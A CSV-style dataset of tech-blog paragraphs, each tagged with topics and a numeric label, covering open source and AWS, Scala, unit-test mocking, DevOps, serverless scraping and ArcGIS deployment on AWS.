3070,"However, if you look at how much value AWS is deriving from open source, it is several orders of magnitude more than their contribution (code or monetary support as with CNCF membership). Imagine a scenario (circa 200607) when AWS was getting started. Do you think they could have convinced Microsoft across the lake to offer flexible licenses for OS and Virtualization so they can offer cloud services? The OSS license is the reason we saw innovation happening in how we consumed compute resources. OSS gave the world cloud computing. Even recently, they are the biggest financial benefactor from Kubernetes (at least based on the public information we can derive) but their contribution back to the project is minimal. They not only lag other hyperscale cloud providers but many of the startups in the Kubernetes community too.","['Open Source', 'AWS', 'Cloud Computing', 'Containers', 'Kubernetes']",10
3071,The usual refrain from AWS advocates is that developers are benefitting from AWS use of OSS. AWS success lies in operationalizing software into an easily consumable service. They do a good job of it and that is why they are a (financially) successful cloud provider. It still doesnt take away the fact they benefit from OSS without contributing back. They make money from operationalizing the software and it is theirs. They need to contribute code back to the OSS project and it is their responsibility.,"['Open Source', 'AWS', 'Cloud Computing', 'Containers', 'Kubernetes']",16
3072,"They do not need Commons Clause to stop Robin Hoodization of OSS. One can stop such abuse with a right license from existing open source licenses. Commons Clause is about getting a slice of profits from other vendors who use the software governed by the license. It is not at all in the spirit of open source. It is about sharing the wealth and not stopping abuse. If AWS or any other vendor add value to an open source software, they have every right to benefit entirely from the value creation. The demand should be about contribution for the value (complying to the spirit of OSS) AWS or any other vendor realize from OSS than sharing the wealth from their business.","['Open Source', 'AWS', 'Cloud Computing', 'Containers', 'Kubernetes']",16
3073,"If I put it bluntly in political terms, Commons Clause is about socialism while some hyperscale providers approach borders around predatory capitalism. Yes, this comparison is not an accurate mapping but I am using it to explain the gulf between the problem (lack of contribution by some hyperscale providers) and the proposed solution (Commons Clause)Good question. When I talk about AWS contributing back in commensurate with the value they derive from OSS, I am only talking about contribution in the spirit of OSS. I dont want AWS to contribute the money they get by providing a service with the open source software. I, rather, want them to contribute back code (that is the OSS spirit) to the community. Code contribution is the only currency that fits well with the OSS spirit. Monetary contribution is secondary and it may even go against the OSS spirit or OSS philosophy. The only way to fix the problem with hyperscale provides abusing OSS is to put enough community and market pressure (instead of putting top AWS folks on the conference stage because they paid their membership dues, put the AWS engineer who contributes a lot to OSS on the stage). Talk to journalists and customers to make them understand the OSS spirit and how it leads to continuous innovation and how it prevents monopoly from developing in the market. The only fix to AWS problem is getting AWS to contribute more code to the projects they consume. Code contribution is the only currency that matters.","['Open Source', 'AWS', 'Cloud Computing', 'Containers', 'Kubernetes']",16
3074,"No SQL databases, on the other hand, are a group of different types of database systems that store related data together. A No SQL (originally referring to non SQL or non relational) database provides a mechanism for storage and retrieval of data that is modeled in means other than the tabular relations used in relational databases. (Wikipedia)Think of No SQL databases as big JSON documents, or key value stores. Theres a lot more to it than that, but for the sake of introductions, well just keep it there. And if you dont know what any of that means JSON, keys, valueswell, weve got a lot of work to do.","['Programming', 'Database', 'Sql Server', 'MySQL', 'NoSQL']",8
3075,"ETL Developer: Gets data out of one system and into another. ETL means Extract, Transform, and Load. When you get the data out of one place, you have to make it fit into another place. While there are dedicated software applications to assist in this role, Ive never used one despite having this job title for about three years. We used 100% custom-rolled PL/SQL Packages in Oracle to do the same thing as expensive software packages. But developers are also very expensive, so was that company really saving any money? When youre a web developer or work on web development projects, youre going to have to interface with data on a regular basis. You might be querying a database directly, or hitting a web service that does it for you and just gives you the data you need.","['Programming', 'Database', 'Sql Server', 'MySQL', 'NoSQL']",8
3076,"Be Returned by Another Function Another feature of functional programming is that functions can return functions. The code below shows a useful use case of this. Sometimes we need to test the logic of a certain function. This can become problematic when functions are dependant on other functions, for example a function that queries a database. It then becomes difficult to test the logic of a single function. If a function is dependant on a function that queries a database, and the unit test for that function fails it becomes difficult to tell if the query to the database failed, or the function logic itself. In scala, we can make use of its function paradigm to isolate dependancies from function logic. Below, the function fake_dependancy simulates a database query that is always successful, and returns a string. The method_that_takes_dependancy function takes in a function (the database query) and returns a new function that contains the logic we need to test. Now, since we know the result of the database query is correct, if we test the function we can be sure we are testing the logic only.","['Programming', 'Scala', 'Functional Programming', 'Object Oriented']",9
3077,"Scala lets programmers define mutable data with the declaration var, and immutable data with val. Declaring a variable with val will not allow the variable to be reassigned. Any attempt at redeclaring immutable data will result in a reassignment to val error. It is important to note, that although immutable data cannot be reassigned, their values can be changed. The value just cannot be made to point to a different value at a different memory location. The code below shows an example of this. The list aliens consists of instances of a class Alien which has a mutable attribute name. The name of the Aliens inside the mutable list can be changed, but we cannot add or remove elements from the list because this would require us to reassign it to a new variable. Having support for mutable types helps keep functions in a Scala program pure, with no side effects.","['Programming', 'Scala', 'Functional Programming', 'Object Oriented']",15
3078,"Ansible is a beautifully simple agentless (and serverless) Configuration Management (CM) tool for configuration management, provisioning, and deployment. Its strength is the agentless nature that makes it simple and powerful. Configuration Management refers to the process of systematically handling changes to a system in a way that it maintains integrity over time, also known as idempotent. Like most of the Idempotent Infrastructure tools (no matter how many times you call the operation, the result will be the same, unless a change needs to be made. ), it provides the ability through declarative language to describe system configuration; Ansible uses YAML (YAML Aint Markup Language) is a human-readable data serialization language syntax for expressing Ansible Playbooks. Ansible Playbooks are the building blocks for all the use cases of Ansible. The different YAML tags are classified into four types knows as declaration, vars, tasks, and handlers; through this article, we will take a practical approach in describing each one.","['DevOps', 'Ansible', 'Docker', 'Jenkins', 'Gitlab']",10
3079,"Barr basically presents a long history of computer science and technology and critically discusses the fact that theres little common agreement on standards and sound SE approaches. He states: The book doesnt contain a lot of concrete advice such as If you structure your methods like this, you will improve your software design and write less bad code. Instead, the author focuses on some of the root causes and explains why the state of the industry is the way it is today. (Spoiler: Among other things, the GOTO statement and the programming language C are responsible for a lot of bad things that happened in software. )The first couple of chapters read a bit long-winded and to me the second half appeared more interesting and thought-provoking. This is probably just due to the fact that, despite some early exposure to BASIC in my Commodore C64 and Amiga 500 days as kid, I could relate more to the more recent developments from my professional experience. However, even the first chapters cite insightful bits of SE research studies:or Overall, I really enjoyed the balanced, thoughtful writing style, and Barrs vast knowledge of both industry and research. He primarily examines the core question Is software development really hard, or are software developers not good at it? Also, what I like is that he doesnt claim to know all answers, which in his case is certainly a form of understatement and humility. (Ill come back to that at the end of the article.) The author highlights some of his personal challenges, caused by the lack of standard SE knowledge and reflected in statements such as: The impact of context in SE projects and a phenomenon he mentions called the Gell-Mann amnesia effect become even clearer when Barr says: In the chapter Design Thinking he covers topics such as the benefits of design patterns and explains in what situations they can be useful, for example when its likely that you want to modify or extend code in the future (since a lot of patterns focus on future extensibility). Their application can be pointless, however, if future changes to a module are unlikely in which case they would only introduce complexity. Moreover, the chapter contains references to amusing terms from noted people like Spolsky (e.g., Architecture Astronautsomebody seeing broader abstractions and patterns everywhere) or other witty observations: The author emphasises that reasonable advice from books such as Clean Code and The Pragmatic Programmer, doesnt present specific approaches. Software design is unique in a sense that developed systems are hardly comparable to each other. Since we often deal with completely new domains and business problems the quality of design outcomes strongly varies even for very experienced people. Barr claims that when you strip away the nonsense from software design, you are left with design patterns and not much else.","['Software Engineering', 'Book Review', 'Articles', 'Research', 'Programming']",9
3080,"Somewhat related to context, in the chapter Your Favorite Language, he mentions that the main issue with our multitude of different programming languages and their opinionated designs is that theres very little guidance on when one language is superior to another one for solving a certain problem. And again later, in the chapter Agile, we only have little knowledge on when exactly agile software methodologies and practices such as Scrum are really valuable. The chapter concludes with: When I spent a couple of years in research and teaching at University, after reading relevant papers or Making Software (one of the rare books that attempt to bring SE research to a larger audience), I was surprised to learn how much SE research actually exists. Often, though, it left me somehow dissatisfied with the conclusions since you secretly expected universal answers like No, TDD is not useful or Yes, Design Patterns are valuablearguments you hoped to use in your next discussions with colleagues to dismantle their religious arguments and anecdotal evidence. Of course, through the constraints of the experimental designs, the answers were frequently similar to Yes, under these conditions and in that specific context, it can make sense. More over, I often felt that the study designs didnt capture software development realities very well (which is one of the main challenges in evidence-based SE).","['Software Engineering', 'Book Review', 'Articles', 'Research', 'Programming']",9
3081,"I particularly liked the final chapter The Future and the authors suggestions on what we can actually do to improve the situation and naturally, a lot of the Barrs ideas have to do with education, how we teach SE at university, and how students are prepared for industry jobs. The chapter is inspirational and when again thinking back about my own academic experience, the gap between academia and industry has always bothered me. Barr cites Weinberg who writes: In an attempt to close this gap a bit, what a colleague of mine and I did back then was coming up with a new course concept for our students called Coding Dojo. The main idea was to set up a multi-day intensive seminar to teach participants what we regarded as important for working in industry later and what they otherwise wouldnt learn in the computer science curriculum. So we brainstormed, came up with ideas, printed a flyer that should attract students, and built an interactive system for teaching topics like code readability, code smells, refactoring, etc. We spent our entire Easter holidays designing this realtime system that could present interactive exercises with automatic evaluations and tried to incorporate everything we knew about the topic back then, including material from books such as Code Complete or Refactoring.","['Software Engineering', 'Book Review', 'Articles', 'Research', 'Programming']",2
3082,"Theres lots to be improved in CS and SE curriculums and as Barr argues, specialisation might help since the entire field has become too wide and complicated to gain a thorough understanding of everything. So rather than making topics like compilers, graphics, and advanced data structurestopics with well researched fundamentalsmandatory, students in their undergraduate degree could choose to concentrate on their preferred subjects. This would then help shaping their profile for future employers and give the degree more credibility. Barr writes: Finally, my favourite piece of advice mentioned in the book and also heard elsewhere in the past is The humble improve, stressing the point that if you stay curious and keep learning while having the attitude of Despite having years of experience, I dont claim to be an expert in that topic and theres always more to know. Even though that advice may sound straightforward, Ive been repeatedly stunned by how high candidates applying for a SE position rate their own skill levels (we ask candidates to fill in a self-assessment sheet before a technical interview). My impression is that usually its a sign of seniority when people with substantial experience dont give themselves the highest ratings in particular areasindicating that they stay intellectually humble and might in fact be the ones who best improve their skills.","['Software Engineering', 'Book Review', 'Articles', 'Research', 'Programming']",2
3083,"QCan you tell us a little bit about what you and your team do at Intel? Im leading a great team of software engineers, performance experts and compiler experts that are focused on accelerating cloud workloads based on scripting languages, and evolving the way performance is being measured in the new world of the cloud. Our team is working on exposing the latest innovations in the Intel server platform to ensure users can derive maximum benefit from Intel technologies. We work with major cloud service providers to understand how they are developing and deploying applications in the cloud, and the challenges they face, so we can provide them with optimizations based on what we learn from them. We collaborate with relevant open source communities who provide us with their insights. And we work with CPU architects at Intel, sharing this external, continuously evolving worldview with them so that, together, we can further enhance the next generation of Intel CPUs and platforms. This way applications can extract maximum performance from the hardware platforms.","['JavaScript', 'Programming', 'Programming Languages', 'Cloud Computing', 'Python']",6
3084,"QWhat trends have you observed in cloud computing relative to your work on programming languages? More than 85% of applications will be delivered via cloud by 2020. So, cloud is an undisputed reality that provides efficiency, agility and cost savings to businesses. Thats why we are focusing on cloud usages and accelerating applications for the cloud. Most of the cloud is powered by open source software. Open source is sparking so much innovation these days that its amazing to see how everything is changing as we look through this new lens. One thing weve been seeing is a shift in development from the traditional C/C++ implementations to dynamic scripting languages runtimes over the last decade. Today, the number of applications that use scripting runtimes and Java have nearly doubled. For example, more than 70% of Open Stack is written in Python. While were sustaining a focus on C/C++ applications, were also investing in optimizing scripting languages runtimes to make sure that this new category of applications benefits from Intel hardware capabilities.","['JavaScript', 'Programming', 'Programming Languages', 'Cloud Computing', 'Python']",16
3085,"QWhy do you think were seeing this move to scripting languages and dynamic runtimes? The use of C/C++ isnt going away anytime soonwe still have a very significant number of critical applications written in C/C++. However, students who go to schools and universities today learn to program in a runtime language, like Java or Python, as opposed to C/C++. Another reason developers are moving to runtime languages is productivity and faster time-to-market. You can develop and release applications so much quicker. For example, only 2% of the code in an application written in Javascript or N __url__ is code that you write yourself. The rest are modules and libraries that you pull in. So, your time-to-market with such applications is significantly faster. Thats an unbeatable value proposition for developers. This is why were seeing all of the innovation that is happening in this spaceand its very exciting.","['JavaScript', 'Programming', 'Programming Languages', 'Cloud Computing', 'Python']",9
3086,"QWhat is Intels role in accelerating innovation in this space? As high-level runtime languages are more widely used, we want to make sure that developers continue to realize the full benefit of Intel architecture. Intel is investing to fuel innovation in this space, and to make sure that all the hardware capabilities in Intel platforms are visible and accessible through these high-level languages. Teams across Intel are working on optimizing a variety of high-level languages, like Go, Python, Java, Java Script, PHP, HHVM, Julia, and others, exposing new instructions and hardware capabilities. With our latest Intel Xeon Scalable Platform release, we have worked hard to ensure that new instructions are being leveraged to accelerate the software. This way, developers will transparently realize the maximum benefits for their workloads. As a result, applications written in scripting languages show performance scaling of about 1.5X. At the same time, we are working with developer communities for the respective languages to understand their needs and challenges, so that we can share these insights with CPU architects to ensure that next-generation Intel CPU architecture and platforms evolve to support these types of applications.","['JavaScript', 'Programming', 'Programming Languages', 'Cloud Computing', 'Python']",16
3087,"Another thing thats very exciting is that we are learning every day. Right now, we are seeing a huge evolution in the way performance is being measured in the cloud. In the past, we were looking at one server, bare-metal workloads running independently on a machine that we kept under our desk, and looking at how to make our applications run faster there. In the cloud, we have different challenges. We have orchestration where our workloads are now placed on different nodes. We have micro-services that have totally changed the way applications are being architected. So, there is a lot of new code that affects the cloud paradigm and has required us to evolve the way we measure performance. This brings incredible technical challenges, and also forces us to stay on the leading edge of the technology.","['JavaScript', 'Programming', 'Programming Languages', 'Cloud Computing', 'Python']",10
3088,"QContainers have been such a hot area of innovation. Can you explain some of the work youre doing to optimize high-level languages for containers? Containerization is definitely revolutionizing the way applications are developed, packaged and deployed. They enable you to get increased efficiency out of your infrastructure, and greater acceleration of your workloads. Containers are forcing us to rethink software architecture. This means there is a lot of work we need to donot only in terms of how we measure performance, but how we develop applications and how we ensure that applications running inside of containers take advantage of new hardware capabilities. Historically, containers have been plagued by the suspicion of security. We love them because they give us speed, but for mission-critical applications, we are always concerned about security. Thats where we have teams at Intel who have developed great innovation as part of Kata Containers that bring the speed of containers and the security of virtual machines (VMs). At the same time, we are enabling hardware capabilities like FPGAs, new CPU instructions, faster memory, and networking so that applications running inside of containers can take advantage of these advancements.","['JavaScript', 'Programming', 'Programming Languages', 'Cloud Computing', 'Python']",10
3089,"QHow are you optimizing high-level languages for some of the latest hardware advancements? Intel brings cutting-edge innovation to market with every server platform that enables us in the software world to fuel new use cases. One example is persistent memory and in-memory databases. With persistent memory coming to life, we see faster access to data. In these high-level languages, you can define objects that are persistent, that dont need to be written to the disc, which gives you acceleration, faster insight and increased business velocity. Consider the time needed to restart a database and reload data from a discthis time is way longer than when you already have that data stored in memory. Persistent memory is actually like unlimited DRAMthink very large memory, close to the CPU. Intel is enabling interfacesbindingsin Python, Java and other high-level languages so that developers can take advantage of this type of memory. This advancement in memory technology brings new use cases that we never imagined before for things like artificial intelligence and big data analytics.","['JavaScript', 'Programming', 'Programming Languages', 'Cloud Computing', 'Python']",3
3090,"QYou mentioned Intels collaboration with high-level language communities. Can you give us more specifics? Im proud of the active role that we play in these projects and communitiesthrough both our code and non-code contributionsto ensure that they grow healthy and strong. We participate in some of the work groups, along with committees that define interfaces into these groups. We are engaged in the N __url__ benchmarking work group, together with other large cloud service providers and software companies. We are also part of the Communication Committee, which targets N __url__ ecosystem development. And because diversity is so important to the health of communities, weve been involved in some of the diversity-related initiatives, supporting Outreachy fellowships for runtimes and the N __url__ diversity caf, as well as participating in Py Ladies. One of our team members is involved in the technical steering committee for N __url__ and just gave a great presentation at last weeks Node + JS Interactive event.","['JavaScript', 'Programming', 'Programming Languages', 'Cloud Computing', 'Python']",6
3091,"QBefore we close, is there anything youd like to add? In the cloud environment, the world is changing for developers. You have the migration to high-level programming languages and the transformation in application architecture and deployment models. You have micro-servicesbreaking down monolithic applications into functional components and implementing these components separately in different languages. And you have serverless computinguploading your code that then is executed, such that you pay only for the length of time it took to execute the code, rather than paying for a full machine. All of these have the potential to bring far more efficiencies, with increased velocity at reduced cost. Were encouraging developers to keep these factors in mind so they can get full benefit of the innovation that is happening in the __url__ Nicole Huesman Community & Developer Advocate.","['JavaScript', 'Programming', 'Programming Languages', 'Cloud Computing', 'Python']",10
3092,"If you have worked in the software industry for more than a week, chances are you have reached the point where the only way to fix your software was to throw it away and start over. Chances are equally high that when that happened, the fingers of blame were pointed at everyone around the room. It was the fault of the software developers for writing bad code. It was the database administrators fault for creating a bad schema. It was the product owners fault for having a bad roadmap. It was the sales managers fault for insisting on features that are out of scope. It was most certainly the fault of someone whos not in the room or no longer with the company.","['Software Development', 'Agile', 'Sdlc']",13
3093,"The point that Im referring to is when the cost and effort to maintain the current software prohibits developing new software to attract new clients. There have been numerous studies and articles written about the cost to attract new clients vs the value of retaining current clients. Without a doubt, it is much easier, cost-effective, and faster to keep your current clients than to attract new ones. It may seem like a no-brainer. If we have software that clients are using, we should do whatever we can to keep them using that software. That is correct, but it might also be short-sighted. Before you scoff at that and go read something else, consider this: Todays client is tomorrows potential client. Just because your software is solving their problem today, it doesnt mean it will solve the problems they will face tomorrow and in the future. When your software has reached the point of starting over, your current clients are a dwindling resource. It is inevitable that your clients will reach the point where their problems have evolved while your software has not and they will solve their problems with your competitor.","['Software Development', 'Agile', 'Sdlc']",16
3094,"You may ask yourself: How did we get to this point? While this may not be easy to hear: Nothing went wrong. Reaching the point where software has grown in an unpredictable manner is the natural result of the software being adaptable. The more easily you can adjust to your clients needs, the more likely you are to introduce a change that may have restrictive consequences. It takes time for those individual updates to accumulate into an unbreakable barrier, but it will happen. Nothing can live forever and software is no exception. The more agile your process for shipping software updates, the faster your software will reach this point. Its not a mistake, it is the maturity of your team and business. Could you imagine operating your business today with technology from 15 years ago? Odds are you would have been running Windows XP with Internet Explorer 6. You wouldnt be able to use Google Chrome for another 5 years. Just as your business grew and evolved, so will your clients. The software they use will also need to evolve.","['Software Development', 'Agile', 'Sdlc']",12
3095,"Now that we understand that software sometimes needs to be completely rewritten, how can we all get on the same page? How do we approach the conversation to start over? Chances are if you have had the conversation to rewrite software it started with a software developer. Chances are equally high that the first time a rewrite was mentioned it was met with an Are you crazy?! from the business side of the equation. While everyone involved with supporting a client-driven software has the same goal, it is difficult for each team to come to the same conclusion at the same time. The people writing the code and fixing the bugs are the ones who deal with the limitations of the software first. They are forced to get creative and discover workarounds to solve a clients problem with a software that never intended to solve that particular problem. Support agents certainly dont like seeing repeating bugs, but if the solution is quick and repeatable, it might be considered acceptable to continue working around the problem. The sales team might not be concerned with bugs that dont affect their clients or inhibit them from attracting new clients. Product managers might be frustrated that milestones in the roadmap cant be reached, but client retention is still good so things are okay. There are a lot of reasons why the different teams that come together to make a software happen would not be on the same page, but its important for all team members to know how to open up to the rewrite conversation.","['Software Development', 'Agile', 'Sdlc']",13
3096,"I still remember the first time I saw it being used by someone else. I had just arrived at the Executive Briefing Center on the Redmond campus. I was scheduled to speak right after Sam Guckenheimer, a colleague of mine. Sam has long been identified as a thought leader in IT. When he brought a slide with my definition on it, I simply could not believe it. To me, there could not be a higher endorsement.",['DevOps'],16
3097,"I doubt anyone would debate that hammers and saws are tools. My question is this: Did a hammer and saw build your home? They were indeed used in the construction of your home, but a hammer and a saw did not build it. Tools like DSC, Power Shell, and Bash are incredible. But you cannot build an entire Dev Ops pipeline with just DSC, for example. A proper Dev Ops pipeline requires a product to orchestrate the tools and string them together such that we can exploit each tool to their limits and use the output of one as input to the next. Products can go beyond the tools and interact with humans and third-party systems to achieve the desired outcome.",['DevOps'],12
3098,"The true purpose of Dev Ops is to deliver value, not software. You can deliver value without changing a single line of your software. I like to use Black Friday and Cyber Monday to explain. As these historic shopping days approach, retailers must make sure their systems are ready for the traffic. Doing so, however, may only require the scaling up or out the infrastructure. Being able to sustain more simultaneous users and keeping your response times down will surely deliver value.",['DevOps'],1
3099,"If we were to over-pivot on software, Dev Ops would be biased heavily towards developers. Aligning on value instead encourages the teams to work together. Many companies I visit have inadvertently incentivized their developer and operation teams to work against each other. Members of the operations team are rewarded by keeping the systems up and stable. The easiest way to keep a system stable is to not change it. Therefore, once the system is stable, operations teams do whatever it takes to keep it that way. On the other side are developers who are rewarded for delivering new features, which requires changing the very systems the operations teams are protecting. These two teams are rewarded when they work against each other. However, if you reward both teams for delivering value to our end users, they will naturally work together. When the teams have a common goal, the best practices like Infrastructure as Code start to pay great dividends. The teams will seek each other out to find ways they can collaborate to deliver value to our end users.",['DevOps'],12
3100,"My time at Compaq was the most exciting of my career. I was writing software for the largest computer company in the world and I had not even graduated yet! What an amazing time to be in tech. I was working on a team creating the first fiber channel boards for Compaq. I was responsible for a tool to help build the first boards. The software I wrote would only ever be used by other Compaq employees. Compaq customers were not my end goal. However, the continuous delivery of value was of paramount importance. Customers are not always the target, but the end users of the software are.",['DevOps'],2
3101,"Code coverage is a measure thats used for describing the degree to which the source code of a program is tested by a particular test suite. Typically, a program with high code coverage has been more thoroughly tested and has a lower chance of containing bugs than a program with low code coverage. But only typically, because even if 100% of the code is covered, we still know nothing about the quality of the tests. Some tests can cover code but be useless, having no necessary assertions or just being badly designed. It sounds counter-intuitive, but to know which code is uncovered is more important. Uncovered code means there are no Unit Test scenarios to verify that the code works as expected.","['Software Development', 'Testing', 'Programming']",13
3102,"If screen scraping were such a great idea, and if it were excellent at connecting systems together, then why is there today such a push for APIs? Why do all modern Java Script UI frameworks have built-in unit testing? From my experience (and perhaps everyones experience) with UI automation techniques, be they OCRing screen sections or control tree interrogation, screen scraping is the worst imaginable method of integrating anythingeven worse than not integrating at all. Furthermore, security constraints and related technologies are advancing counter to screen scraping technologies. Screen scraping gets around authentication, lets just be honest about that. Thats why users sometimes have to install browser plug-ins to be able to interrogate secure Web pages. Screen scrapers work like keyloggers or other malware basically.","['Computer Science', 'Software Development', 'Artificial Intelligence', 'Tech', 'Process Automation']",19
3103,"My suggestion is to approach such a homework assignment as an in-depth Product Design or Improvement question. Make sure you ask a lot of questions to clarify the goalwhy are we improving this product? What is the scope of this? What sucks about the current way? After this, you can begin dissecting and using the product in order to figure out what doesnt work for this specific set of users and come up with solutions to improve it. Do assess the tradeoffs, impact, and level of effort for your solution! I had a PM friend give me feedback on the completed work just to make sure its clear.","['Interview', 'Product Management', 'Engineering', 'Careers', 'Interview Questions']",0
3104,"There will be times you dont know how to proceed or your mind goes blank. Ive been through that more times than Id like to admit. Articulate your thought process on what you are unsure about. A good product interview flows like a conversation, and this encourages the interviewer to help you out.","['Interview', 'Product Management', 'Engineering', 'Careers', 'Interview Questions']",0
3105,"If a UT is aimed at testing a single class, but the code inside the class relies on other classes (i.e. units), how will we test only the code contained in the class, filtering out the noise coming from possible bugs in other classes? Also, how will we avoid invoking potentially long-running computations, and focusing only in the logic that we wish to test? Mocking is a fancy way of saying I dont care how this unit of code is actually implemented, I want this input to return this output. In fact, mocking gives the assurance of an expected result, thus removing (i.e. mocking) the dependency over an external unit of code.","['Unit Testing', 'Software Testing', 'Software Development']",9
3106,"At this point we are already one step ahead, as weve already found the bug. However, in a real use case, theres no clairvoyant blog post writer pointing to the bugs in the code base. As such we need to write UTs to catch this fine grained problems. A good question here would be Why not write a system-test/integration-test instead? First of all, it is much more painful to cover all the possible execution paths through system-tests or even integration tests, compared to using unit tests. Secondly, the performance overhead of storing data to the database, connecting to an SMTP server, etc. would increase the total test duration to an unbearable point, and could also generate other unrelated errors (e.g.","['Unit Testing', 'Software Testing', 'Software Development']",13
3107,"At this point, the question should actually be How do I write a unit test that can both exercise the intended code path, as well as avoid any performance boilerplate? This is where mocking comes in. The idea is to mock any dependency (i.e. component) that is not required to our test case. Lets get right to an example:(for simplicity, these code snippets use Mockito as mocking framework and JUnit as a testing framework)It is as simple as it looks. In a nutshell: We declare three test fields: two mocks ( email Service Mock and database Mock ) and the main test object, built with the two mocks.","['Unit Testing', 'Software Testing', 'Software Development']",15
3108,"Regarding the intended code path, the code snippet is self-explanatory: the test merely calls the broadcast method. The second part of the question above (how to avoid performance overhead?) is handled more under the hood. Mockito#mock is one of the main methods of the framework. It creates a dynamically-generated implementation of the provided class. At a first approach, these implementations are intended to be no-op, as in, calling them would have no effect in the system. This prevents, for instance, the Database Service to issue a read operations when Database Service#get is called. This approach allows tests to be not only faster, but also easier to setup and to maintain.","['Unit Testing', 'Software Testing', 'Software Development']",15
3109,"The test that was just created is called broadcast Should Use Mail List Id, and naming is something really important. Not only in production code but also in test code. By default, the test name is used in test reports. So, if in the test report I see a red cross in Notification Broadcaster Test#broadcast Should Use Mail List, Ill assume that the code in Notification Broadcaster#broadcast is not working as expected. It would be really sad and painful to find out that the actual bug is in another downstream dependency, namely due to the fact that in enterprise-level code, the set of downstream dependencies can include hundreds of lines of code. Due to mocking, and the possibility of isolating components embedded in a dependency tree, this becomes a real possibility.","['Unit Testing', 'Software Testing', 'Software Development']",15
3110,"To enforce the importance of test reports, lets consider this analogy. Consider a developer who declares a Java Map, with a given set of keys and values. Then, further in the code, the developer wants to fetch a value for a given key. However, instead of fetching the key directly (through Map#get), the developer searches for the key iteratively. This is not exactly wrong, because the result will be the same. However, by following this approach the developer is ignoring the true value of a map-based structure.","['Unit Testing', 'Software Testing', 'Software Development']",9
3111,"Test reports can also relate to this analogy. A test report is a set of test cases, identified by the class name and test method name. Therefore, we should be able to identify which unit of code is being tested given a test identifier. Moreover, given a failing test case, we should be able to directly map the unit of code where the bug is. However, this does not seem to be the common approach. Usually, software engineers look at test reports as monolithic binary test reports. Unfortunately, most times the process follows the guideline: either we have failures or we dont, and if we do, the test case identifier is ambiguous and we cannot directly map it to the unit where the bug is introduced. This represents a clear misuse of the test reports capabilities. So, when writing tests, and for the sake of test reports, we should carefully pick the name for our test classes and methods, and also, through mocking, isolate the unit of code that is intended to be tested.","['Unit Testing', 'Software Testing', 'Software Development']",13
3112,"Considering a small (up to 30 classes) code base, this seems quite an easy rule to follow. However, as the code grows, so does complexity, as well as the challenge to maintain the discipline of following this rule. Thus, this scenario is simply not realistic for massive code bases. There is no golden rule here, as this is a clear tradeoff between perfection and efficiency. Classes that are more complex (i.e. bug prone) are more likely to originate bugs, thus are better candidates for unit testing than classes that have simpler responsibilities (e.g.","['Unit Testing', 'Software Testing', 'Software Development']",9
3113,"Scraping tasks are defined as Java classes extending the Abstract Task class. For instance, you could create sub-classes Amazon Price Task and Exams Results Task. While implementing these classes, you would essentially need to define input parameters (e.g. your student ID number to be filled in to a search form on the university website later on) for the crawling script and a series of commands in the run() method to be executed by Web Driver.crawling-core is developed as a standalone Java command-line application, where the name of the task to be executed (e.g. EXAM_RESULT_TASK) and the input parameters (e.g. VAR_STUDENT_ID, VAR_DEPARTMENT_NAME) are provided as run arguments or environment variables.","['AWS', 'Cloud Computing', 'Java', 'Nodejs', 'Serverless']",15
3114,"To execute a scraping task, e.g. our Exams Results Task, AWS Fargate will pull the latest Docker image from the registry, create a new container from it, set the required input parameters as environment variables and eventually run the entrypoint, which is our JAR file. is a very simple Lambda function written in Node JS, which is responsible for launching a crawling job. It is triggered regularly through a Cloud Watch event. First, it fetches all crawling tasks from Dynamo. A crawling task is a unique combination of a task name and a set of input parameters. Afterwards it requests Fargate to start a new new instance of crawling-core for every task and passes the input parameters contained in the database item. is another Lambda, which stands at the very end of one iteration of our crawling process. It is invoked through messages in the crawling-changes SQS queue and responsible for sending out notification e-mails to subscribers. It reads change information from the invoking event, including task name, the subscribers e-mail address and the tasks output parameters (e.g. your exam grade) and composes an e-mail message that eventually gets sent through the Simple E-Mail Service (SES).","['AWS', 'Cloud Computing', 'Java', 'Nodejs', 'Serverless']",7
3115,"The gold standard for usability says keep your interactions at 100ms and they feel instant. This notion moved onto web performance. We make it our mission to get out TTFB for web requests down to that 100ms mark. Lets take the case of a network packet traveling from AWS us-east-1 to Dubai. Taking the best network conditions ever, a direct fiber optic cable between sever and client (browser or mobile app), would take around 40ms. That gives you 60ms to process the response and get it on the wire. Reaching that ideal connection scenario for all your users is a far fetched assumption, and realistically looking at the state of mobile network latencies, it will take much longer than the ideal 60ms for that packet to travel 12,000 km.","['Web Development', 'Sre', 'DevOps']",11
3116,"Linux kernel includes code written by hundreds of contributors who did not assign copyright to Linux. This means that they retain the copyright. Even if Linus Torvalds wanted to re-license the software, he would need to either buy the code, or ask for permission of every single one of the contributors. However, it is impossible for the contributors to revoke licenses at this particular stage completely. They can restrict the usage of the subsequent iterations, but the code thats been already released will still be available for everybody to use, as the relicensing wont apply retrospectively.","['Open Source', 'Linux']",16
3117,"You can find an AMI for Arc GIS Enterprise 10.6.1 on Windows right here. Also, make sure to compare the instance prices between availability zones. Im deploying in US West, and Ive figured out that Oregon is roughly 25% cheaper than N. California. (Disclaimer: I dont live in the US. If you do, this may make more sense to you than to me. )Launch the instance on Amazon and create yourself a private key. Because this is Windows and not Linux, you will use it to decrypt the Remote Desktop password to log into the machine, instead of logging in using SSH.","['AWS', 'Arcgis', 'Servers', 'Esri', 'GIS']",7
3118,"Welcome to your new Windows machine on the cloud. If you deployed the AMI I mentioned earlier, you would find various shortcuts on the desktop. One of those shortcuts will be Arc GIS Server Authorization; another is Portal for Arc GIS Authorization. License your software through those shortcuts. This guide will not cover the authorization process. You do need to make sure that Arc GIS Server, its roles and the portal are all licensed before proceeding with this guide.","['AWS', 'Arcgis', 'Servers', 'Esri', 'GIS']",7
3119,"This server is the first piece of software you will configure. You need to open a browser on the server machine. This request might bring to your attention that only Internet Explorer is present on this AMI. Lets take a moment to detour and download our favorite browser. Through that new browser, navigate to: Your browser will warn you that the certificate is invalid. We will deal with the certificate issues later on. On your first visit to the Arc GIS Manager, you will need to create an Administrator account. Choose your username and password, save them for later, and submit. If everything went well, you would reach a services window that shows the current services your deployment offers. It will be one service created by the system. The Arc GIS Server is up. No further actions on it for now.","['AWS', 'Arcgis', 'Servers', 'Esri', 'GIS']",7
3120,"Arc GIS Datastore is the service that corresponds with the Managed Database you are going to utilize. In other words, you can treat it as a DB Service. Search for services in your start menu and select the appropriate system app. In the list, you will find Arc GIS Datastore. in the service properties make sure it is set to Automatic so it will run with each restart (just in case something goes wrong and the server will restart, you will not need to guess). While youre there, change/verify the startup settings for Arc GIS Server and Portal for Arc GIS services. Start those services which were off, and if other related services appear because of roles you have added in your authorizations, change the startup setting for them as well.","['AWS', 'Arcgis', 'Servers', 'Esri', 'GIS']",11
